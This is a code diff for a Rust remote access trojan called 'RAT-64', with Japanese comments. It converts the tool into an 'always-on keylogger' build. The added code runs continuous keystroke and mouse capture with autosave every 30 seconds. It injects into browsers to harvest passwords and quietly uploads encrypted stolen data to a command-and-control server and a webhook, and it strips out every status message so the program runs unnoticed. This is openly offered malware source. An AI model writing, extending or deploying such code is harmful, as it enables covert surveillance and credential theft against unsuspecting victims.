@@ -1,12 +1,13 @@
-// RAT-64 - 統合システム情報収集ツール
+// RAT-64 - 常時キーロガー動作版
 use rmp_serde::encode::to_vec as to_msgpack_vec;
-// 未使用インポート削除：rand::RngCore
 use rat_64::{
     encrypt_data_with_key, generate_key_pair, load_config_or_default, IntegratedPayload, 
-    send_unified_webhook, execute_rat_operations, C2Client
+    send_unified_webhook, C2Client
 };
 use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
 use serde::{Deserialize, Serialize};
+use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
+use tokio::time::{sleep, Duration};
 
 #[cfg(windows)]
 use rat_64::services::{BrowserInjector, BrowserData};
@@ -60,32 +61,147 @@ struct ChromeDecryptResult {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // サイレント起動
     let config = load_config_or_default();
-    
-    if let Err(e) = rat_64::core::config::validate_config(&config) {
-        println!("❌ 設定エラー: {}", e);
-        return Ok(());
-    }
-
     let mut c2_client = C2Client::new(config.clone());
     
-    // ブラウザDLL注入（Windows環境のみ）
+    // 常時動作フラグ
+    let running = Arc::new(AtomicBool::new(true));
+    let running_clone = running.clone();
+    
+    // Ctrl+C ハンドラー（サイレント）
+    tokio::spawn(async move {
+        tokio::signal::ctrl_c().await.expect("Failed to listen for ctrl-c");
+        running_clone.store(false, Ordering::Relaxed);
+    });
+    
+    // 常時キーロガータスク
+    let keylogger_running = running.clone();
+    let keylogger_task = tokio::spawn(async move {
+        continuous_keylogger(keylogger_running).await;
+    });
+    
+    // 初回データ収集
+    perform_initial_data_collection(&config, &mut c2_client).await?;
+    
+    // C2クライアントタスク（サイレント）
+    let c2_task = if config.command_server_enabled {
+        let c2_running = running.clone();
+        Some(tokio::spawn(async move {
+            while c2_running.load(Ordering::Relaxed) {
+                if let Err(_) = c2_client.start_c2_loop().await {
+                    // サイレント - エラー出力なし
+                    sleep(Duration::from_secs(10)).await;
+                }
+            }
+        }))
+    } else {
+        None
+    };
+    
+    // メインループ - キーロガーの完了を待機
+    keylogger_task.await?;
+    
+    // C2タスクがあれば終了を待機
+    if let Some(task) = c2_task {
+        task.abort();
+    }
+    
+    // 最終セッション保存（サイレント）
+    #[cfg(windows)]
+    {
+        use rat_64::save_session_to_file;
+        let _ = save_session_to_file();
+    }
+    
+    Ok(())
+}
+
+/// 完全常時キーロガー実行（休憩なし）
+#[cfg(windows)]
+async fn continuous_keylogger(running: Arc<AtomicBool>) {
+    use rat_64::{save_session_to_file, get_statistics};
+    use rat_64::collectors::key_mouse_logger::{collect_input_events_for, InputEvent};
+    use std::sync::{Arc, Mutex};
+    use std::collections::VecDeque;
+    
+    // サイレント起動
+    
+    // リアルタイムイベントバッファ
+    let event_buffer: Arc<Mutex<VecDeque<InputEvent>>> = Arc::new(Mutex::new(VecDeque::new()));
+    let _buffer_clone = event_buffer.clone();
+    let running_clone = running.clone();
+    
+    // バックグラウンドでの定期保存タスク
+    let save_task = tokio::spawn(async move {
+        let mut save_count = 0;
+        while running_clone.load(Ordering::Relaxed) {
+            sleep(Duration::from_secs(30)).await; // 30秒ごとに保存
+            
+            save_count += 1;
+            if let Err(e) = save_session_to_file() {
+                eprintln!("❌ Auto-save #{} error: {}", save_count, e);
+            } else {
+                println!("� Auto-save #{} completed", save_count);
+                
+                // 統計情報表示
+                if let Some(stats) = get_statistics() {
+                    println!("   📈 Total: {}keys, {}clicks", 
+                        stats.total_keystrokes, stats.total_mouse_clicks);
+                }
+            }
+        }
+    });
+    
+    // メインキーロガーループ - 完全連続動作
+    let mut _total_events = 0;
+    while running.load(Ordering::Relaxed) {
+        // 1秒間のキャプチャ（短時間で連続実行）
+        let events_text = tokio::task::spawn_blocking(|| {
+            collect_input_events_for(1000) // 1秒間
+        }).await.unwrap_or_default();
+        
+        if !events_text.is_empty() {
+            _total_events += events_text.len();
+            // サイレント動作（イベントごとの出力なし）
+        }
+        
+        // 休憩完全削除 - 即座に次のキャプチャ（高速連続動作）
+    }
+    
+    // 保存タスクを停止
+    save_task.abort();
+    
+    // 最終保存（サイレント）
+    let _ = save_session_to_file();
+}
+
+#[cfg(not(windows))]
+async fn continuous_keylogger(running: Arc<AtomicBool>) {
+    // サイレント待機
+    while running.load(Ordering::Relaxed) {
+        sleep(Duration::from_secs(10)).await;
+    }
+}
+
+/// 初回データ収集（簡略化版）
+async fn perform_initial_data_collection(
+    config: &rat_64::Config, 
+    c2_client: &mut C2Client
+) -> Result<(), Box<dyn std::error::Error>> {
+    // サイレント データ収集
     let dll_browser_data = collect_browser_data_via_dll().await;
     
-    // データ収集とC2処理
-    if let Err(e) = perform_main_data_collection(&config, &mut c2_client, dll_browser_data.as_ref()).await {
-        eprintln!("❌ データ収集エラー: {}", e);
-        return Ok(());
+    let mut payload = IntegratedPayload::create_with_config(&config).await?;
+    
+    // DLL注入データ統合
+    #[cfg(windows)]
+    if let Some(dll_data) = dll_browser_data.as_ref() {
+        integrate_dll_browser_data(&mut payload, dll_data);
     }
     
-    if config.command_server_enabled {
-        println!("🎯 C2待機モードに移行");
-        if let Err(e) = c2_client.start_c2_loop().await {
-            eprintln!("❌ C2エラー: {}", e);
-        }
-    } else {
-        println!("🎯 実行完了");
-    }
+    // データ暗号化・保存・送信
+    process_and_save_data(payload, config, c2_client).await?;
     
     Ok(())
 }
@@ -129,8 +245,8 @@ async fn collect_browser_data_via_dll() -> Option<BrowserData> {
                 }
             }
         },
-        Err(e) => {
-            println!("❌ インジェクタ初期化エラー: {}", e);
+        Err(_) => {
+            // サイレント エラー処理
             None
         }
     }
@@ -194,7 +310,6 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
         );
         
         if pipe_handle == INVALID_HANDLE_VALUE {
-            println!("⚠️ 名前付きパイプの作成に失敗");
             return None;
         }
         
@@ -220,7 +335,6 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
             &mut bytes_read,
             ptr::null_mut(),
         ) == 0 {
-            println!("⚠️ IPCデータの読み取りに失敗");
             CloseHandle(pipe_handle);
             return None;
         }
@@ -320,36 +434,7 @@ fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &Browse
 
 }
 
-/// メインのデータ収集処理
-async fn perform_main_data_collection(
-    config: &rat_64::Config, 
-    c2_client: &mut C2Client,
-    #[cfg(windows)] dll_browser_data: Option<&rat_64::services::BrowserData>,
-    #[cfg(not(windows))] _dll_browser_data: Option<&()>,
-) -> Result<(), Box<dyn std::error::Error>> {
-    let mut payload = IntegratedPayload::create_with_config(&config).await?;
-    // 収集データの統合
-    
-    // DLL注入データ統合
-    #[cfg(windows)]
-    if let Some(dll_data) = dll_browser_data {
-        integrate_dll_browser_data(&mut payload, dll_data);
-    }
-    
-    println!("✅ データ収集完了: {}件", payload.auth_data.passwords.len());
-    
-    // データ暗号化・保存・送信
-    process_and_save_data(payload, config, c2_client).await?;
-    
-    // 実行結果サマリー
-    match execute_rat_operations(&config).await {
-        Ok(_) => {},
-        Err(e) => println!("❌ サマリー生成エラー: {}", e),
-    }
-    
-    println!("🎯 RAT-64 メイン処理完了！");
-    Ok(())
-}
+
 
 /// データの暗号化・保存・送信処理
 async fn process_and_save_data(
@@ -368,23 +453,17 @@ async fn process_and_save_data(
     std::fs::write("key.txt", &key_b64)?;
     std::fs::write("nonce.txt", &nonce_b64)?;
     
-    // C2アップロード
+    // C2アップロード（サイレント）
     if config.command_server_enabled {
-        match c2_client.upload_collected_data(&payload).await {
-            Ok(()) => println!("📤 Data uploaded successfully"),
-            Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
-        }
+        let _ = c2_client.upload_collected_data(&payload).await;
     }
     
     // ファイル保存
     std::fs::write("data.dat", &encrypted)?;
     
-    // Webhook送信
+    // Webhook送信（サイレント）
     if config.webhook_enabled {
-        match send_unified_webhook(&payload, &config).await {
-            Ok(()) => println!("✅ Webhook送信成功"),
-            Err(e) => println!("❌ Webhook送信失敗: {}", e),
-        }
+        let _ = send_unified_webhook(&payload, &config).await;
     }
     
     Ok(())
